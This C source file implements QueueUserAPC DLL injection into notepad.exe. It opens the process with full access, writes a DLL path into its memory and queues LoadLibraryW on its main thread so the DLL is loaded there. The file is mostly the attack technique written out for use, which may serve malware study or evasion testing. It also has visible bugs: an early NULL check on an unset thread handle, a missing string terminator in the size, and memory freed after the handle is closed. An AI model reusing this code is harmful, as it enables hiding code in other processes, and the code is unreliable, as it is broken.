#include "QueueUserAPC.h"


BOOL QueueUserAPC_Injection()
{
	// Some vars
	TCHAR lpDllName[] = _T("InjectedDLL.dll");
	TCHAR lpDllPath[MAX_PATH];
	HMODULE hKernel32;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	DWORD dwProcessId, dwThreadId;
	FARPROC LoadLibraryAddress;
	LPVOID lpBaseAddress;
	BOOL bStatus;
	DWORD dResult;

	/* Get Process ID from Process name */
	dwProcessId = GetProcessIdFromName(_T("notepad.exe"));
	if (dwProcessId == NULL)
		return FALSE;
	_tprintf(_T("\t[+] Getting proc id: %d\n"), dwProcessId);

	/* Obtain a handle the process */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (hProcess == NULL) {
		print_last_error(_T("OpenProcess"));
		return FALSE;
	}

	/* Get thread id from process id */
	dwThreadId = GetMainThreadId(dwProcessId);
	if (hThread == NULL)
		return FALSE;
	_tprintf(_T("\t[+] Getting main thread id of proc id: %d\n"), dwThreadId);

	/* Getting thread hanlle from thread id */
	hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);

	/* Obtain a handle to kernel32 */
	hKernel32 = GetModuleHandle(_T("kernel32.dll"));
	if (hKernel32 == NULL) {
		print_last_error(_T("GetModuleHandle"));
		return FALSE;
	}
	/* Get LoadLibrary address */
	_tprintf(_T("\t[+] Looking for LoadLibrary in kernel32\n"));
	LoadLibraryAddress = GetProcAddress(hKernel32, "LoadLibraryW");
	if (LoadLibraryAddress == NULL) {
		print_last_error(_T("GetProcAddress"));
		return FALSE;
	}
	_tprintf(_T("\t[+] Found at 0x%08x\n"), (UINT)LoadLibraryAddress);

	/* Get the full path of the dll */
	GetFullPathName(lpDllName, MAX_PATH, lpDllPath, NULL);
	_tprintf(_T("\t[+] Full DLL Path: %s\n"), lpDllPath);

	// The low-order DWORD of the maximum size of the file mapping object.
	DWORD dwSize = _tcslen(lpDllPath) * sizeof(TCHAR);

	/* Allocate memory into the remote process */
	_tprintf(_T("\t[+] Allocating space for the path of the DLL\n"));
	lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (lpBaseAddress == NULL) {
		print_last_error(_T("VirtualAllocEx"));
		return FALSE;
	}

	/* Write to the remote process */
	printf("\t[+] Writing into the current process space at 0x%08x\n", (UINT)lpBaseAddress);
	bStatus = WriteProcessMemory(hProcess, lpBaseAddress, lpDllPath, dwSize, NULL);
	if (bStatus == NULL) {
		print_last_error(_T("WriteProcessMemory"));
		return FALSE;
	}

	/* Injection Happen here */
	dResult = QueueUserAPC((PAPCFUNC)LoadLibraryAddress, hThread, (ULONG_PTR)lpBaseAddress);
	if (dResult == NULL) {
		print_last_error(_T("QueueUserAPC"));
		return FALSE;
	}

	else {
		_tprintf(_T("Remote thread has been created successfully ...\n"));
		WaitForSingleObject(hThread, INFINITE);

		// Clean up
		CloseHandle(hProcess);
		CloseHandle(hThread);
		VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);
		return TRUE;
	}
}





